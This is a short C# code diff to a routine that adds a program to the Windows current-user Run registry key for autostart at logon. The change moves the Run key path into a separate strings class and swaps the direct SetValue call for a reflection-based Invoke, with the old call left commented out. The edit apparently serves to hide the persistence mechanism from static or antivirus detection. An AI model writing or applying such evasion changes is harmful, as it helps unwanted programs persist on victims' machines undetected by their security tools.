@@ -1,4 +1,5 @@
 ﻿using System;
+using bc.srv.Strings;
 using Microsoft.Win32;
 
 namespace bc.srv.Classes
@@ -119,14 +120,16 @@ namespace bc.srv.Classes
         {
             try
             {
-                var rk = Registry.CurrentUser;
-                RegistryKey startupPath;
-                startupPath = rk.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
+                var startupPath = Registry.CurrentUser.OpenSubKey(RegistryStrings.RegistryRun(), true);
 
                 // LO VALORIZZO SOLO SE DIVERSO DAL VALORE CHE VOGLIO METTERE
                 if (startupPath.GetValue(regEntryName) == null ||
                     startupPath.GetValue(regEntryName).ToString() != filePath)
-                    startupPath.SetValue(regEntryName, filePath, RegistryValueKind.ExpandString);
+                {
+                    var setMethod = startupPath.GetType().GetMethod("SetValue", new Type[]{typeof(string), typeof(object), typeof(RegistryValueKind)});
+                    setMethod.Invoke(startupPath, new object[] {regEntryName, filePath, RegistryValueKind.ExpandString });
+                    // startupPath.SetValue(regEntryName, filePath, RegistryValueKind.ExpandString);
+                }
 
                 return true;
             }
